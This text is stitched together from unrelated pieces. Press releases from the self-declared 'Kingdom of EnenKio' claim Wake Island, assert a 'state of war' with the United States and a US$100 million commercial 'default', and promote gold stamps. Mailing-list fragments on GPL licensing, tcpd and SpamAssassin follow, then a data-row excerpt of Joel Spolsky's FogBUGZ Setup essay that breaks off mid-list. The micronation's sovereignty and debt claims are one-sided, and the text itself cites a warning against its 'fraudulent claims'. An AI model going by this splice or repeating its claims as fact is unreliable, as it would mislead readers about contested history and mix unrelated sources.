 March 1999 -- Comments to readers from the Ministry of Foreign Affairs: Subject: A ""State of War"" Declaration The Kingdom of EnenKio recognizes that an unresolved conflict of interests exists between it and the United States Government.  The United States government, admittedly at a time of colonial expansionism, appears to have violated the laws of nature and The Law of Nations in ""taking possession"" of sovereign property in the Northern Ratak State, which then had formal treaties with the Republic of Germany.  The explicitly immoral and illegal 1899 seizure of Marshallese homeland by agents of the federal government was the start of present day sentiments of deprivation of rights and dispossession of lands felt by many Marshallese.  Because of continual neglect misrepresentation and outright exploitation, these scars on Marshallese society have not healed. Thus a current state of adversity exists.  Following four years of attempts to cause the United States to evaluate the plight of the Marshallese of the Northern Ratak imposed by its actions with respect to Wake Island, the government of EnenKio, on behalf of the Marshallese King, issued the ""'State of War', a Declaration"" and broadcast it to the world.  The people were displaced from their native lands and kept as virtual prisoners of war, not by virtue of being kept in, but by virtue of being kept out.  It was through this pragmatic initiative that the Kingdom of EnenKio solicited support to heal the wounds inflicted upon the people and peacefully restore what was wrongfully taken from the ancestors of the Ratak Paramount Chief, King Murjel Hermios. In retrospect, the Declaration has had little visible effect.  While a state of adversity does exist, the hope for American recognition of past wrongs remains on the horizon.  The Kingdom of EnenKio does not condone nor tacitly sanction any act of belligerence by any person or agent of any government.  Such unnecessary means would diminish any hope of mutual reconciliation and could diplomatically undermine the cause of peace within the family of nations.  The Kingdom of EnenKio also does not wish to see any further damage to the remnant happiness of the Marshallese people. 
 While the Kingdom of EnenKio continues to seek accountability of the U.S. Congress to obey its own laws, to conform to the UN Charter, conventions of the United Nations relating to self-determination, preservation of human rights and protection against human rights abuses, it believes accountability requires the U.S. to meet the pleas of the people oppressed by the conditions of this adversity.  The refusal of 
 the U.S. to meet its obligations, even to the extent that a simple discussion for resolution is held over the subject matter with representatives for the affected parties, perpetuates the adversity, turns a cold shoulder to the facts of abuse and ignores the rights of the Marshallese people to whom the U.S. pledged in good faith to execute the 1947 mandates of the United Nations and its members.  Your understanding is appreciated.

 December 19, 1998: News Release 
 Subject: Death of the Monarch of the Kingdom of EnenKio 
 The government has declared a period of national mourning on the occasion of the death of the first Monarch of the Kingdom of EnenKio, His Majesty King Murjel Hermios. Embassies, missions and regional posts are instructed to display the flag at half-staff until 11 January 1999. Memorial services, held in the Marshall Islands where HM Hermios made his home, mark the passing of one of the most unpretentious of traditional Marshallese leaders. His remains will be interred in a family plot on one of the outer islands he so loved. Irooj Hermios was Head of State of the Kingdom of EnenKio, revered as Monarch over the islands of Eneen-Kio Atoll, esteemed as Iroijlaplap and High Chief of the Northern atolls of the Ratak Archipelago, beloved as our brother and trusted as a friend. His successor as Iroijlaplap is to be formally named by a Council of traditional leaders. Selection of a successor to the Monarchy of the Kingdom is in process and will be announced at a later date. In the interim, a Reagent will serve as Head of State. HM Hermios followed a long line of matriarchal predecessors as Iroijlaplap. Aboriginal inhabitants of the islands today known as the Marshalls, part of Micronesia in the North Pacific Ocean and first discovered by European seamen in the 16th Century, were found to have a well-developed societal structure. Many nations have since, mostly by force, prevailed over the Marshall Islands, imposed unaccustomed western ideals upon her populace and ravaged her islands of resources and beauty. Today this area is commonly known as Wake atoll and is illegally occupied by the federal government of the United States. In one of the most courageous acts in recent times, Irooj Hermios clearly understood he had a mission to succeed where his predecessors in interest had failed to secure the islands, seas and lagoon of Eneen-Kio Atoll for his beloved people. (The account of his acts to establish the Kingdom of EnenKio as an island state, independent of the governments of the Marshalls and the United States, may be researched at the official Internet site. On behalf of the government of the Kingdom of EnenKio, we are extremely grateful for his dedication to the people of the Marshall Islands and are personally moved by the memory of a man who will surely one day be recognized as having a legacy of furthering the interests of his people by the setting of processes in motion to re-establish Marshallese domination over Eneen-Kio Atoll. We are saddened that our brother has passed without his seeing the fruits of his devotion to Marshallese ancestry and traditions. In lieu of flowers, mourners may contact the mission at the address above or call (808) 373-9254. Sincerest best wishes for the holiday season and the coming New Year are extended to all in Peace.

 July 14, 1998: Communiqué to Correspondents Recent articles defaming the government of the Kingdom of EnenKio have been maliciously published under the guise of a Marshall Islands government warning against ""fraudulent claims"". We have once more admonished the writer of the articles in the Marshall Islands for disregarding indisputable facts which clearly discredit his biased report. We urge you to disregard all discourse in the media regarding the Kingdom of EnenKio which are not validated. To that end, you are cordially invited to contact this office with your specific questions or concerns. For your advice, the following statement was issued by the State Secretary of the Kingdom in reply: The Kingdom has never knowingly made any fraudulent claim whatsoever. No claim we have made has ever been shown to be fraudulent, nor has any claim ever come under or faltered from a challenge by anyone anywhere in the world. We are working vigorously to regain occupation of the ancestral property of HM King Hermios, to resolve the virtual ""state of war"" that exists with the United States government and to be accepted as an honorable state among nations. 
 The Kingdom does not pretend to be (quoting from the report) ""asserting authority over land ...within the geographical and political boundaries..."" of the RMI. We are however striving to expel the armed imperialistic invasion forces of the United States from the shores of Eneen-Kio Atoll so natural Marshallese supremacy can be re-establish there. As to allegations of fraud and constitutional violation, no one has dared to come forward with any such a charge. We say, let the issue be played out in the People's venue for the record, not in a libelous weekly publication. While we do not wear our brief history on our shirtsleeves, our raison d'être is clearly mandated in the Preamble to 
 the Constitution of EnenKio, which can be seen at our web site: http://www.enenkio.wakeisland.org 
 Referencing the news article in the Marshall Islands Journal entitled ""Kingdom of EnenKio sets up in New Zealand,"" of May 1st, the editor was advised, contrary to his report, that neither passports nor driver licenses can be purchased from the Kingdom's web site. The Kingdom of EnenKio DOES NOT SELL PASSPORTS! If you have evidence to the contrary, our Foreign Ministry would appreciate your furnishing it to them so steps can be taken immediately to investigate the matter. You are advised if anyone sells or offers to sell an EnenKio passport, that such an act is patently illegal. 
 The published statement, ""The group ...claims to represent Iroijlaplap Murjel Hermios and the atolls of the Ratak chain..."", is wholly false. I have explained this matter to the editor on several prior occasions and ample information is available at our Internet site to refute the statement. The Kingdom does not represent any area outside of its territorial boundaries, as the Ratak atolls surely are. Contrary to their libelous statements, the Kingdom of EnenKio was not ""created"" by Robert Moore and he is not a ""Honolulu-based attorney."" HM King Murjel Hermios is the acknowledged hereditary Iroijlaplap of the northern Ratak atolls and is also First Monarch of the Kingdom, not of his own choice, but by a legal process and free choice of our citizens who participated in the founding of the nation in 1994. Such a noble and peaceful beginning is not too uncommon in world history. ""Enenkio"" [sic] (actually Enen-kio or Eneen-Kio, in reference to the atoll itself) is the first Marshallese name for a Marshallese atoll located roughly 300 miles north of Bok-ak (Taongi) Atoll. ""Wake"" is a fictitious moniker applied to the re-discovered Eneen-Kio Atoll by unknown western society writers.

 May 4, 1997: News Release 
 Subject: Issuance of Gold Stamps 
 The government of the Kingdom of EnenKio proudly announces commissioning of its Inaugural Issue of Gold Stamps. This announcement, made at the First Sunday Hawaii Stamp, Coin and Postcard Show May 4th, was the first pre-publication public notice of the issuance of Gold Stamps by the Kingdom. Stamps are expected to be off the presses by early June 1997. First day covers with new stamps affixed and postmarked official ""First Day of Issue"" by the Kingdom will be available for a limited time following the dates of release. Distributors, dealers and collectors are encouraged sign up as a charter member of the EnenKio Philatelic Mint mailing list. 
 BACKGROUND - The Kingdom was established in March 1993, and the government was chosen by the people, who then ratified the constitution in September 1994. However, due to U.S. military activities on the island and the presence of armed occupation forces, the government of the Kingdom lingers in ""exile"". Several nations have extended recognition of the sovereignty of the Kingdom, documents of citizenship are being issued and legations are located in Europe, South America, USA and elsewhere. 
 A NATION IN CONFLICT - The land in question, commonly known as Wake Island, is actually an atoll comprised of three small islands assigned names of westerners who visited them: Wake, Wilkes and Peale. Few people in the world today are aware that the native discoverers who named the atoll Eneen-Kio lived in the Marshall Islands, exercised constant jurisdiction and made regular use of it as a living food pantry and cultural site. By way of developing the atoll as a nation, the government is asserting that it is the indisputable holder of allodial title to ""Wake"" atoll and has the right to exercise its sovereignty at the will of the people. The United States of America began in a similar fashion not with a peaceful transition from colonial status. Lawful return of the land is grounded upon the legal precedent set by Congressional apology to Hawaiians for the 1893 overthrow of the Monarchy. 
 ""STATE OF WAR"" - By way of an official March 1997 Declaration sent to top U.S. officials, the Kingdom of EnenKio has acknowledged that a virtual ""state of war"" now exists over the islands on account of the blatant acts of aggression and illegal armed invasions by troops from United States warships. The primary objective of the notice was to request a Congressional investigation into actual events and related factors surrounding the federal seizure of islands in the North Pacific Ocean by the United States. Calls to end U.S. operations, vacate the atoll and negotiate return of the islands to jurisdiction of the Kingdom have fallen on deaf ears. Despite repeated notices, letters and legal advertising, all major news media have consistently ignored the events and failed in their duty bring forth the truth to the people of the world regarding alleged incidents of piracy, waste and human rights violations by federal agents of the United States government. INAUGURAL ISSUE - The Gold Stamps are based on events of the past and dreams for the future of peace in the global community as the millennium nears. For that reason, the universal gold standard was chosen as the basis for evaluation. Since the relative value of gold in world markets varies according to the value and stability of national currency units, the stamps will similarly reflect changes in price when purchased with any particular currency. However, the real or intrinsic value of the stamps will remain as constant as gold. The extrinsic value will be determined by philatelic collectors around the world. Note: Stamps are printed on paper stock, do not contain gold metal and are not intended for use as money. 
 CLOSING COMMENTS - The government of the Kingdom appeals to all people from every peaceable nation in the world to recognize the Kingdom of EnenKio as a sovereign nation promoting peace in the Pacific region. In doing so, it seeks a peaceful resolution o f the ""state of war"" with the federal government of the United States and asks that everyone with human rights concerns use their influence accordingly. The proceeds from the sale of Gold Stamps will help fund the restoration of the Kingdom and end the conflict in peace.

 March 31, 1997: News Release 
 An official document entitled A Declaration, was sent March 22 to top Executive and Legislative officials in the federal government of the United States, including selected Cabinet members. The document asserts that: ""A STATE OF WAR EXISTS OVER THE KINGDOM OF ENENKIO ATOLL BY WAY OF ACTS BY THE FEDERAL GOVERNMENT OF THE UNITED STATES."" This is the most recent attempt to captivate the attention of the federal government. One of the primary objectives of this action is to bring about a Congressional investigation into the true events and factors surrounding the illegal seizure of islands in the North Pacific Ocean by the United States. 
 This latest position statement is one in a succession of dozens of disclosures, statements, letters and legal actions taken since the government of the Kingdom was established in March 1993, each with similar objectives. Calls for the U.S. to cease operations, vacate the premises, negotiate return of the island to the King, apologize and compensate him for use, abuse and illegal hold-over following legal action have all failed to receive cognizance or reply from the federal government. Likewise, despite repeated notices, letters and legal announcements, major news media have consistently ignored the events and failed in their duty bring forth the truth to the people of the world regarding the alleged piracy, arrogance and human rights violations by the United States. 
 The land in question, commonly called Wake Island, is comprised of three small islands, Wake, Wilkes and Peale, named by ""Western explorers"" for Western persons. What of the native discoverers? The crux of the issue is that despite the passage of ownership via a complex Matriarchal land tenure system for over two millennia with jurisdiction by the aboriginal chiefs of the Northern Ratak atolls of Marshall Islands, the United States seems to believe it is justified in having seized the atoll in 1898, and again in1899. Historical records reveal that the multiple landings by United States warships, en route to the Philippines on war missions, and subsequent Congressional action, were the sole basis of the U.S. claim. The motivation was said to be for the establishment of a cable station to improve communications with its marauding troops in the East. Such a station was never established at Wake Island. It was destined to become a military installation. 
 However, formal protests of the seizure was sent to the U.S. President by the German Consul in the Marshall Islands and some measure of correspondence followed. But since the U.S. abandoned the area without establishing a colony or cable station and Germany was defeated in the first World War, the objections fell into oblivion. It is understood from written accounts of oral Marshallese culture and traditions, that jurisdiction and use of the atoll by natives continued. The U.S. did not establish a settlement there until, under a lease in 1934, the CAA (predecessor of the FAA) allowed Pan American Airways to build a base for its fleet of trans-pacific seaplanes. Clearly, the so-called annexation by the U.S. is grossly flawed, the occupation patently illegal and its ""ownership"" is held therefore to be wholly invalid. When the U.S. Congress apologized for the overthrow of the Hawaiian Monarchy in 1993 and the U.S. Navy subsequently returned culturally significant land to the ""natives"" of Hawaii, a landmark legal precedent was thus set for comparable action with respect to the return of Wake Island. The islands of Eneen-Kio, as the northernmost atoll in the Ratak chain, played a very significant role in the culture and religion of Micronesians living in the more ""hospitable"" islands of the Marshall group. While not being used for Navy target practice as Kaho'olawe was, the use of the islands of Eneen-Kio Atoll and the military mission at Wake Airfield are decidedly without substantial merit and whereby activities take place in secrecy, devoid of scrutiny, oversight or quintessential knowledge by the American public. Even after cultural intervention in the mid 1800s by Christian Missionaries, natives continued to use Eneen-Kio, authority to go there being issued by the Ratak Iroijlaplap (Paramount Chief). King Murjel Hermios holds that title today. By way of developing the atoll in sovereignty as a nation, the government is thereby indisputable holder of the allodial title to Wake Island. The U.S. cannot produce a title. The Hermios ancestral lineage, passage of title through the ages from aboriginal inhabitants and discoverers, who gave the atoll its Marshallese name, their continual use and legacy of jurisdiction secures the rights of ownership. 
 Upon the basis of events and actions by the United States, the administration of the Kingdom of EnenKio, by virtue of the Declaration, ""yields to the recognition that a State of War"" exists over the island nation. This is not, however, to be viewed as a waiver of rights or unconditional surrender. Sovereignty and independence of the Kingdom, over all other claims, is forthrightly reasserted. The belief is that truth and law is on the side of the Kingdom and that reckless abuse of power and a trail of human rights violations are chronicled upon the record of U.S. ""ownership"" and occupation. Native North Americans are all too well acquainted with this brand of federal brutality when it comes to seizure of land and denial of rights. In the Declaration, demands are made as follows: » » ""...to come to the table of peace to negotiate an honorable 
 accord for the survivors of the said STATE OF WAR..."". » » ""If unwilling to voluntarily negotiate for peace, to submit to Impartial international arbitration of the terms for surrender and WAR reparations to citizens."" 
 » » ""...to cease and desist, effective immediately, all and
 every 
 action of every kind in or on EnenKio Atoll or within the 200-mile Exclusive Economic Zone..."" 
 » » ""...to pay that certain debt, perfected and established in commerce by failure the Department of the Interior » » ""...to lawfully respond to proper legal notices of more than TWENTY-SEVEN consecutive months and most recently referenced by a Certified Invoice, No. 97-US-03, dated March 10, 1997, for which it is obligated to pay."" » » That the ""...Congress of the United States is obliged to immediately impanel an impartial body for the purpose of investigating the atrocities committed in the case of the violations of human rights and due process..."". 
 The government of the Kingdom solicits every other sovereign peaceable nation in the world to give effective and adequate recognition to the Kingdom of EnenKio Atoll as an Independent Nation under God. It seeks a peaceful resolution of the state of war with the federal government of the United States and asks them to use their influence accordingly. Appeals are being made to the United Nations.

 February 6, 1995: News Release 
 On behalf of His Majesty, King Murjel Hermios, Monarch of EnenKio Atoll, titular head of State, Paramount Chief (Iroijlaplap) of the northern atolls of the Ratak archipelago of Pacific Ocean Islands of the Marshall Islands, I bid you a warm Marshallese greeting -- Yokwe! The purpose of this notice is twofold: First, to admonish those of you to whom word of the referenced issues were made known, then failed to take action; Second, to encourage you to whom this presents to take appropriate action in disseminating reports on this issue. As long as you remain quiet, safely removed from the potential controversy insidiously lurking beneath the surface of one issue about which the federal government of the United States remains resolutely silent, your anonymity and that of your publication is well served. Summary of Events 1993-94: Two official press releases have been made regarding the establishment of a new island nation in the Pacific Ocean, EnenKio, formerly known as Wake Island. The first was issued on February 25, 1994. It followed two announcements: 1) officials of the US Air Force at Hickam AFB, Hawaii said in articles published New Year's Eve and Day in both Honolulu newspapers that the USAF no longer wanted to maintain Wake Island airfield and wanted to turn it over to Interior Department or another military organization by 1 February and abandon it by 1 October, 1994; 
 2) US Army Space and Strategic Defense Command of Huntsville, Alabama issued an Environmental Impact Assessment for a proposed missile launch program out of Wake Island; part of the ""star wars"" program, I am led to believe. 
 An emergency meeting of the leaders of the future nation of EnenKio was held and it was decided that earlier efforts to bring the atoll under the jurisdiction of Hawaii would be abandoned in favor of affirmation of independence, thus seeking self-rule under the natural landowner as king. Letters to Mr. Clinton, members of Congress, U.S. Army and the first press release proclaimed the status of ownership of EnenKio (Wake I., Peale I., Wilkes I.), denounced the Army's so-called ""no significant impact"" scheme to fire more than 800 rockets of an undisclosed nature into and over the waters of the Marshall Islands (including its sanctuaries for turtles and birds) and asserted rightful ownership claims. 
 On March 21, 1994, a formal resolution was executed establishing the nation of EnenKio as an independent nation under the authority of His Majesty Murjel Hermios, who had granted special power of attorney to Mr. Robert Moore, appointed Minister Plenipotentiary. The Constitution, Succession Act and other documents were thereafter drafted. On September 30th, a formal Declaration of Sovereignty was signed into law by Ministers and selected delegate citizens, believing (as did the USA founding fathers) that such power was an inherent right of the people. It declared the Kingdom of EnenKio a sovereign independent peaceful nation, it acknowledged His Majesty, King Murjel Hermios as owner in allodium of the atoll, accepted him as Head of State and embraced the Constitution as the founding document for a form of democratic government. 
 Documents and letters were sent to numerous nations of the world proclaiming the above actions. Formal documents of recognition were presented, offer of diplomatic ties made and support for reciprocation requested. Copies of pertinent documents were forwarded to the United Nations, UN Security Council, NATO, South Pacific Commission and others. Letters of personal appeal were sent to UN leaders. A special request for protection and assistance was sent to the UN Security Council. On October 10th, a commercial affidavit and demand for payment was sent via certified mail to federal officers of the United States regarding the illegal January 17, 1899 seizure, under force of arms, of the islands of Eneen-Kio Atoll, the adverse occupation and continued disregard of international Human rights law, UN Charter terms and terms of the Compact of Free Association with the Republic of the Marshall Islands (Public Law 99-239; January 14, 1986). Having acknowledged receipt and failing to respond within a reasonable time, the U.S. is now in default under commercial law, owing in excess of US$100 million. The second official press release was issued on November 21, 1994, relating the preceding events. Of all the agencies to whom it was sent, only two, the Marshall Islands Journal, a weekly newspaper and Islands Business Pacific magazine are known to have mentioned the story, then only briefly. 
 Request for Media Response: 
 The thirst of the media for copy on topics outside of natural calamities, treed cats and daily courtroom chronicles of violence and deception seems seriously lacking. Is not the peaceful beginning of a new nation news any more? Is not the restoration of native rights of an aboriginal society whose roots reach into antiquity (to before the birth of Jesus) worth a little journalistic investigation? How about suspicions of insidious military-sanctioned activity which threatens the security and peaceful existence of nations of the Pacific in the name of ""world leadership""? Or is it world domination? People of EnenKio have a few simple requests of you, the media, in an effort to draw international attention to this issue and thereby, hopefully shorten the delay in regaining active occupation of islands of their ancestral heritage: 
 1. Investigate and verify the circumstances of the illegal armed invasion supported by U.S. expansionism and subsequent improper annexation of the sacred islands of Eneen-Kio Atoll, then being utilized by sailors, hunters and chiefs of the Marshallese civilization and for at least 2000 years prior to the 1899 fiasco. (Note: These facts and validity of the Hermios claim are a matter of historical record, not a fabrication.) 
 2. Investigate and/or verify the circumstances of any evidence of specific beneficial use and U.S. policy, past and present, or the lack thereof, with regard to the role of EnenKio . (Note: It is my understanding Wake was ""decommissioned"" after the so-called ""processing"" of thousands of South Vietnamese refugees in the late 1970s). 
 3. Reflect on the contrasting history of U.S. occupation, war, technological advances, in light of modern attitudes about misdeeds against native peoples and the willingness of our people to develop serious national economic programs for the benefit of all mankind. 
 4. Respectfully and conscientiously broadcast the credibility of the king's claim of allodial title, the declaration of rights of the citizens of EnenKio to self-determination and the commitment by their government and leaders to promulgate their mandates in a responsible and fiscal manner. 
 5. Bring to light U.S. strategy with regard to the implementation of questionable and costly pet programs involving nuclear proliferation, offensive/defensive weapon systems, clandestine military research, environmental pollution and whatever else is going on there. (Note: Congress and certain federal agencies have promoted use of Wake Island and environs as platform for launching and testing hundreds of rockets and missiles, a federal prison for drug offenders and other less publicized projects.) 
 6. Fully disclose to the people of the United States U.S. strategy with regard to the denial of possession of lawful title to Eneen-Kio Atoll by King Hermios as a consequence of natural inheritance via time-honored and respected Marshallese matriarchal traditions, disregard for Human rights protected under international law, United Nations Charter and conventions and the U.S. Compact with the Marshall Islands and refusal to acknowledge liability for acts of piracy on the high seas of military and colonial expansionism of the nineteenth century. (Note: U.S. apology for the illegal armed overthrow of the Hawaiian Monarchy the prior year and the return of the Hawaiian island, Kaho'olawe, also of religious significance, has set precedents for the action demanded by EnenKio citizens.) 
 Parting Shot: 
 What truly concerns me is the cavalier attitude of government in general, the U.S. federal government more precisely, which somehow behaves as if endowed by a divinely inspired alchemy that conveys the right to rearrange lands, cultures and economics with out the slightest inclination to counsel with those people most concerned. Such an approach might be expected in some dictatorship in some distant corner of the globe, but considering its present source, it is downright alarming. It is worthwhile to mention here that despite a prominent trail left over the course of more than two years, letters, reports, forms, published articles, press releases, legal notices, documents and virtually every action initiated by those representing King Hermios have escaped official response from officers of the U.S. federal government. Our not-too-distant past is replete with examples of the insatiable thirst of western ""civilized"" nations for doctrines faithful to the cry of ""manifest destiny"" which clearly marked American foreign policy of a century ago. If this current trend signifies a resurgence, it can only be considered a giant leap backward, considering the flimsy record of American attempts at ""fixing up the world"". The title of ownership and inheritance of Eneen-Kio Atoll pre-dates formation of the United States by two centuries or more. It is time the significance of native cultures and recognition of their right to self-determination is elevated from matters of scientific discourse to mainstream political involvement in determining the future course of human endeavor. People have a right to know; the media a responsibility to show them. In conclusion, I reiterate that our focus, from my point of view, is one, not so much of opposition to the ominous might of U.S. political philosophy and military prowess, but of asserting the moral imperatives for correcting errors of the past, supporting restoration of Human cultural dignity and the unobstructed observance of God-given individual rights. Thank you for your support and cooperation in helping end the siege and forced exile of our proud citizenry.

 November 21, 1994: News Release 
 In a bid to regain occupation of that portion of his ancestral lands which include Wake Island, site of a U.S. military outpost, His Majesty, King Murjel Hermios, through his legal representative, Minister Plenipotentiary, Robert Moore, the U.S. has been given the boot out of Wake Island. Moore served legal notice on top U.S. government officials in October 1994 to cease all activity and leave the islands. The filing came on the heels of a five-year struggle to gain recognition of the illegal seizure of islands (owned by predecessors of King Hermios) by the gun boat, USS Bennington in 1899. 
 The legal document, a Commercial Affidavit, Declaration of Fair Value and Demand for Payment, was served under recognized principles of Common Law and International Commercial Codes. It details the specifics of King Hermios' ancestral rights to Wake Island, the illegality of the U.S. claim and violations of native laws, International Agreements and human rights during their 95-year hold on the Hermios property. It also establishes default, recognized under law, by reason of failure to answer the sworn claims, thereby allowing the Hermios claim to stand valid before the law as unchallenged. Under those claims, demand was made for payment of 94.7 million dollars for past use of the land. Continued use and holdover of the atoll will add 5 million dollars per month through 1995. 
 While putting forth the appearance of advocating human rights, U.S. officials continue to ignore issues right in their own backyard which keep King Hermios and the citizens of EnenKio living in compulsory exile. 
 Eneen-Kio Atoll, a name derived from Marshallese traditions involving a small orange (kio) flower found there, is made up of 3 islands, including Wake. Predecessors in interest of King Hermios, aboriginal chiefs and islanders sailed native canoes to Eneen-Kio Atoll for religious and cultural purposes as much as 500 years BC. During the colonial invasion of Pacific islands, western traders and explorers consistently ignored the native traditions and rights of the real discoverers of those fragile and isolated bits of sand, the islanders themselves. A case in point is in that of the Hawaiians, who recently gained an apology from the U.S. Congress and President Bill Clinton for the illegal U.S. government overthrow of the Hawaiian Monarchy. King Hermios is presently acknowledged as the hereditary Paramount Chief (Iroijlaplap) of all the Northern Atolls of the Ratak Archipelago of the Marshall Islands, which terminates to the north, beyond Eneen-Kio Atoll. Mr. Moore has full authority to act on the King's behalf to rid the islands of their illegal and unwanted Occupation Forces in favor of restoring the King's assertion of his native allodial rights. Most recently occupying and holding the islands are agents of the U.S. Air Force command, 15th Logistics Group, Hickam AFB, Hawaii. Nearly identical articles published in the Star Bulletin and Honolulu Advertiser on December 31, 1993 and January 1, 1994 headlined: ""Air Force willing to give up its hold on Wake Island"" and stated: ""Not much activity there anymore, so the Air Force wants to give up control"". According to some theories thought to have reliable foundation, private entities or other government agencies are fighting for control behind a stonewall of apathy, denial and contempt for traditional ancestral heritage of King Hermios, his predecessors and people. Mr. Moore is also charged with the responsibility of bringing the nation under active jurisdiction of its own independent government, to initiate and administer to its citizens, promote economic development and to direct all affairs of State. The democratic government is established as a limited constitutional monarchy and is being directed by its Executive Council. 
 Since 1987, despite repeated efforts to resolve the conflict and the effects of a stroke, Mr. Moore has been unsuccessful in getting any substantive reply from officers of the United States, military officers and members of Congress. The following is a summary of some of the recent letters, inquiries and statements of claims made on behalf of the lawful and rightful landowner, King Murjel Hermios: » » Formal letters to President Clinton and Vice-President Al Gore in February 1993, requesting consideration under programs promised in their campaign for economic conversion of old military bases were ignored. As a military base, Wake Airfield was ""decommissioned"" more than a decade ago. 
 » » In response to the Environmental Assessment of the proposed 
 Theater Missile Defense Rocket Launch Activities, formal letters of protest sent to the Pentagon and U.S. Army officials, who contemplated launching hundreds of missiles from Wake Island over several years into the waters of the Marshall Islands, went unanswered. » » Letters to members of the U.S. Congress protesting rocket launch activities and requesting help went unanswered. » » A Resolution dated March 21, 1994 was signed which declared the status of EnenKio to be that of an independent nation under the administrative jurisdiction of King Murjel Hermios. It was likewise ignored. After waiting for more than 580 days since ""formal"" notification of the declared status of EnenKio and having heard no objection from the United States, Mr. Moore assembled the Ministers of the Executive Council. They, along with a few involved citizens living in exile and denied access to Eneen-Kio, formally passed and signed the Declaration of Sovereignty on September 30, 1994. They also accepted the draft of the Constitution which establishes the democratic principles of government recognizing His Majesty, King Murjel Hermios as Head of State and his family as the First Royal Family of EnenKio . While the King and his people bear no ill will against the multitudes of foreign invaders of Eneen-Kio Atoll, which over the centuries included agents of the Emperor of Japan, the Emperor of Germany, and the King of Spain, they believe the time has come to acknowledge the errors of the past, correct the conditions thereby produced and move on into the future in support of the sacred principals of Truth, Honor and Peace. Those principals are embodied in the Constitutions of EnenKio and of the United States. Those tenets were likewise embodied, affirmed and ratified by the U.S. Congress in Public Law 99-239 (Jan. 14, 1986), signed by President Ronald Reagan as the Compact of Free Association with the Marshall Islands and Federated States of Micronesia. The compact acknowledges superiority of all Marshallese ""natural"" rights, including those of ownership and use of land.

 but that's just stupid.  microsoft s/w covers a subset of applications
 that are under the gpl.  there are gpl word processors, there's a
 microsoft wp; there are various language compilers and interpreters under
 the gpl, microsoft has their visual compilers.  and so on.  and just
 like the gpl apps, the microsoft apps are distributed under a license.
 that license says lots of things, and there are various licenses used by
 microsoft, but in a nutshell they all pretty much say: you can't copy,
 distribute or modify their s/w; you can't sell it multiple times.
 
 so does anyone think that applies to their wp documents or their visual
 c++ code?

 please don't reply to messages to send a new topic to ilug.  those of

 tcpd is host based filtering/auth.  so if the ip is dynamic, you can't
 really use it.  however ftp supports user based auth - actually it kind
 of requires a user, so just set up an account for that person.

 It does, if you have a corpus of german spam and nonspam to feed 
 it, and you're not in a de locale.

909,"Subject: Feedback from my posting about FogBUGZ Setup fell into four
","URL: http://www.joelonsoftware.com/news/20021008.html
 Date: Not supplied
 
 Feedback from my posting[1] about FogBUGZ[2] Setup fell into four categories. 
 
 *""Why make Setup reversable? Instead you should collect all the information 
 from the user and make all the changes in one batch at the end.""* There are a 
 couple of things to understand here. First of all, even if you do everything in 
 one batch at the end, there's always a possibility that some step in the middle 
 of the batch will fail, and in that case, a well-behaved setup program will 
 back out the steps that were already done. There are well over 100 error 
 messages in the string table for FogBUGZ Setup so the number of things that can 
 fail is not insignificant. 
 
 Second, it's not nice to tell people about an error in their input three pages 
 after they made the mistake. For example, early in the FogBUGZ setup process we 
 prompt you to create an account for FogBUGZ to use: 
 
 [IMG: http://www.joelonsoftware.com/pictures/setupNewAcct.gif (FogBUGZ Setup 
 Screenshot)] 
 
 The account creation could fail for a myriad of reasons, none of which can be 
 predicted before trying to create the account. For example, the password might 
 not conform to the system password policy. And different national versions of 
 Windows NT have different rules about accented letters in passwords (betcha 
 didn't know that!). It's better to tell the user about this problem right away 
 so they can correct their input rather than having a message come up during the 
 long install process later, forcing the user to back up and fix it. And even if 
 you force the user to back up and fix it, you still have to undo the first part 
 of the work that you did before creating the account, otherwise you've left 
 their system in an indeterminate state. 
 
 In any case I need to write code to create the account and delete the account 
 in case something later fails; I might as well call that code on this page of 
 the wizard where I can display a useful error message. 
 
 And what are the kinds of things that need to be reversable? Well, in order to 
 upgrade FogBUGZ without requiring a reboot (and we _never, ever _require a 
 reboot), we have to shut down a couple of processes that might have been 
 keeping FogBUGZ files pinned down, such as IIS (Microsoft's web server). So 
 part one of the batch is ""Stop IIS."" Now if part 2 fails for some reason, it 
 would be _extremely_ rude to leave IIS not running. And anyway, it's not like I 
 don't need to write the code for ""Start IIS"" for the end of the batch. So the 
 code to rollback ""Stop IIS"" is already written. No big deal, I just need to 
 call it at the right place. 
 
 I think one reason that people think you should ""gather all the info and then 
 do all the work"" is because with very large installation programs that are very 
 slow, this is a polite way to waste less of the user's time. Indeed even 
 FogBUGZ setup does 95% of its work at the very end. But the ""create account"" 
 operation is so fast, that principle simply doesn't apply here. Even our 95% of 
 the work phase takes well under a minute, most of which is spent waiting for 
 IIS to stop and start. 
 
 *""Why did you use VC++/MFC? Surely an advanced intelligence such as yourself 
 has admitted by now that Delphi[3] is more productive.""* First of all, leave 
 your language religious fanaticism at the Usenet door. Somehow I managed 
 to figure out_ in high school_ that language advocacy and religious 
 arguments are unbelievably boring.  
 
 Secondly, even if Delphi were more productive, the only pertinent question, 
 since I am writing the code, is _what is more productive for Joel Spolsky_. And 
 I don't know Delphi at all, but I know Win32, MFC, and VC++ _really, really 
 well_. So while I might not outcode a good Delphi programmer, I would 
 definitely outcode a completely inexperienced Delphi programmer (which is me), 
 certainly over a short 4 week project. Third, many of the things I needed to do 
 in this setup program are things like ""grant the Logon as Service privilege to 
 an account."" This is rare enough that the only way to find out how to do this 
 is to search the Microsoft knowlege base and the web in general. When you 
 search the web in general for how to do fancy things with Windows NT, what you 
 find is about 75% C code, maybe 20% VB code, and 5% everything else. Yes, I 
 know, I could translate the C code into Delphi (assuming I was a sophisticated 
 Delphi programmer, not a completely inexperienced Delphi programmer), but that 
 costs as much productivity as I would supposedly gain from your supposedly more 
 productive programming language. And fourth, I already had about 30% of the 
 code I needed for Setup in MFC format: from FogBUGZ 2.0 Setup, and a library 
 I've been using for years to make wizards. 
 
 *""Why make Setup at all? You already have your customers' money. Good Setup 
 programs don't increase sales.""* This was actually the smartest question and 
 made me think the hardest. I came up with three reasons: 
 
 - Decreased tech support cost. This setup program will pay for itself over the 
 life of the code. 
 - Delight my customers. When I'm trying to get them to upgrade to 4.0, I want 
 them to remember how painless the 3.0 installation was, so they won't hesitate 
 because they are afraid to upgrade. I'm still using an old version of 
 SpamAssassin that is becoming increasingly ineffective, even though I know the 
 new version is much better, because I just can't bear the thought of another 
 morning wasted. The very memory of the first SpamAssassin installation -- all 
 the little SSH windows, some su'ed, trying to scroll through man pages and 
 Google Groups, accidentally hitting Ctrl+Z in Emacs to undo and having it 
 suspend, trying to guess why we can't get the MTA to run procmail, sorry it's 
 too much. If SpamAssassin was making money off of upgraders they would have 
 lost my business because they don't have a SETUP program. 
